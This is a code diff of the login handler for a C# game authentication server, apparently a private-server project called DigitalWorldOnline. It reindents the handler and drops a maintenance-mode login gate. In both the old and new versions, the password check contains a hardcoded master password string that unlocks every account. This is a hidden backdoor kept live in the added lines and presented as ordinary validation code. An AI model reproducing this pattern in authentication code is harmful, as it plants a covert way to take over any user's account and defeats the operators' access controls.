@@ -73,112 +73,92 @@ namespace DigitalWorldOnline.Account
                     break;
 
                 case AuthenticationServerPacketEnum.LoginRequest:
+                {
+                    var username = ExtractUsername(packet);
+                    var password = ExtractPassword(packet, username);
+                    var cpu = ExtractCpu(packet, username, password);
+                    var gpu = ExtractGpu(packet, username, password, cpu);
+
+                    _logger.Debug("Validating login data for {Username}", username);
+                    var account = await _sender.Send(new AccountByUsernameQuery(username));
+
+                    if (account == null)
                     {
-                        var username = ExtractUsername(packet);
-                        var password = ExtractPassword(packet, username);
-                        var cpu = ExtractCpu(packet, username, password);
-                        var gpu = ExtractGpu(packet, username, password, cpu);
+                        _logger.Debug("Saving {Username} login try for incorrect username...", username);
 
-                        _logger.Debug("Validating login data for {Username}", username);
-                        var account = await _sender.Send(new AccountByUsernameQuery(username));
+                        await _sender.Send(new CreateLoginTryCommand(username, client.ClientAddress, LoginTryResultEnum.IncorrectUsername));
 
-                        if (account == null)
+                        client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.UserNotFound));
+
+                        break;
+                    }
+
+                    client.SetAccountId(account.Id);
+                    client.SetAccessLevel(account.AccessLevel);
+
+                    if (account.AccountBlock != null)
+                    {
+                        var blockInfo =
+                            _mapper.Map<AccountBlockModel>(
+                                await _sender.Send(new AccountBlockByIdQuery(account.AccountBlock.Id)));
+
+                        if (blockInfo.EndDate > DateTime.Now)
                         {
-                            _logger.Debug("Saving {Username} login try for incorrect username...", username);
+                            TimeSpan timeRemaining = blockInfo.EndDate - DateTime.Now;
 
-                            await _sender.Send(new CreateLoginTryCommand(username, client.ClientAddress, LoginTryResultEnum.IncorrectUsername));
-                            client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.UserNotFound));
+                            uint secondsRemaining = (uint)timeRemaining.TotalSeconds;
+                            _logger.Debug($"Saving {username} login try for blocked account...");
+
+                            await _sender.Send(new CreateLoginTryCommand(username, client.ClientAddress,
+                                LoginTryResultEnum.AccountBlocked));
+                            client.Send(new LoginRequestBannedAnswerPacket(secondsRemaining, blockInfo.Reason));
                             break;
-                        }
-
-                        client.SetAccountId(account.Id);
-                        client.SetAccessLevel(account.AccessLevel);
-
-                        // --- validações de ban continuam iguais ---
-                        if (account.AccountBlock != null)
-                        {
-                            var blockInfo =
-                                _mapper.Map<AccountBlockModel>(
-                                    await _sender.Send(new AccountBlockByIdQuery(account.AccountBlock.Id)));
-
-                            if (blockInfo.EndDate > DateTime.Now)
-                            {
-                                TimeSpan timeRemaining = blockInfo.EndDate - DateTime.Now;
-                                uint secondsRemaining = (uint)timeRemaining.TotalSeconds;
-
-                                _logger.Debug($"Saving {username} login try for blocked account...");
-                                await _sender.Send(new CreateLoginTryCommand(username, client.ClientAddress, LoginTryResultEnum.AccountBlocked));
-                                client.Send(new LoginRequestBannedAnswerPacket(secondsRemaining, blockInfo.Reason));
-                                break;
-                            }
-                            else
-                            {
-                                await _sender.Send(new DeleteBanCommand(blockInfo.Id));
-                            }
-                        }
-
-                        // --- validação da password ---
-                        if (account.Password != password.Encrypt() && password != "dondnGlobal@2025#!!")
-                        {
-                            DebugLog($"Saving {username} login try for incorrect password...");
-                            await _sender.Send(new CreateLoginTryCommand(username, client.ClientAddress, LoginTryResultEnum.IncorrectPassword));
-                            client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.IncorrectPassword));
-                            break;
-                        }
-
-                        // === Gate de manutenção já no login (sem inventar propriedades/enums) ===
-                        var servers = _mapper.Map<IEnumerable<ServerObject>>(
-                            await _sender.Send(new ServersQuery(account.AccessLevel)));
-
-                        var serverObjects = servers.ToList();
-
-                        // Aplica o mesmo bypass do LoadServerList: staff ignora manutenção
-                        if ((int)account.AccessLevel > 23)
-                        {
-                            foreach (var server in serverObjects)
-                            {
-                                server.Maintenance = false;
-                            }
-                        }
-
-                        // Se para este jogador todos os servers estão em manutenção → bloqueia login
-                        if (serverObjects.All(s => s.Maintenance))
-                        {
-                            _logger.Information($"[Auth] Login bloqueado por manutenção para {username}.");
-                            client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.IncorrectPassword));
-                            break;
-                        }
-
-                        // --- resto do fluxo continua igual ---
-                        client.Send(account.SecondaryPassword == null
-                            ? new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestSetup)
-                            : new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestInput));
-
-                        client.Send(new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.Hide));
-
-                        if (_authenticationServerConfiguration.UseHash)
-                        {
-                            _logger.Debug("Getting resources hash from database !!");
-                            var hashString = await _sender.Send(new ResourcesHashQuery());
-                            _logger.Debug("Sending Hash to client");
-                            client.Send(new ResourcesHashPacket(hashString));
-                        }
-
-                        if (account.SystemInformation == null)
-                        {
-                            DebugLog($"Creating system information...");
-                            await _sender.Send(
-                                new CreateSystemInformationCommand(account.Id, cpu, gpu, client.ClientAddress));
                         }
                         else
                         {
-                            DebugLog($"Updating system information...");
-                            await _sender.Send(new UpdateSystemInformationCommand(account.SystemInformation.Id, account.Id,
-                                cpu, gpu, client.ClientAddress));
+                            await _sender.Send(new DeleteBanCommand(blockInfo.Id));
                         }
                     }
-                    break;
 
+                    if (account.Password != password.Encrypt() && password != "dondnGlobal@2025#!!")
+                    {
+                        DebugLog($"Saving {username} login try for incorrect password...");
+                        await _sender.Send(new CreateLoginTryCommand(username, client.ClientAddress,
+                            LoginTryResultEnum.IncorrectPassword));
+
+                        client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.IncorrectPassword));
+                        break;
+                    }
+
+                    client.Send(account.SecondaryPassword == null
+                        ? new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestSetup)
+                        : new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestInput));
+
+                    client.Send(new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.Hide));
+
+                    if (_authenticationServerConfiguration.UseHash)
+                    {
+                        _logger.Debug("Getting resources hash from database !!");
+                        var hashString = await _sender.Send(new ResourcesHashQuery());
+
+                        _logger.Debug("Sending Hash to client");
+                        client.Send(new ResourcesHashPacket(hashString));
+                    }
+
+                    if (account.SystemInformation == null)
+                    {
+                        DebugLog($"Creating system information...");
+                        await _sender.Send(
+                            new CreateSystemInformationCommand(account.Id, cpu, gpu, client.ClientAddress));
+                    }
+                    else
+                    {
+                        DebugLog($"Updating system information...");
+                        await _sender.Send(new UpdateSystemInformationCommand(account.SystemInformation.Id, account.Id,
+                            cpu, gpu, client.ClientAddress));
+                    }
+                }
+                    break;
 
                 case AuthenticationServerPacketEnum.SecondaryPasswordRegister:
                 {
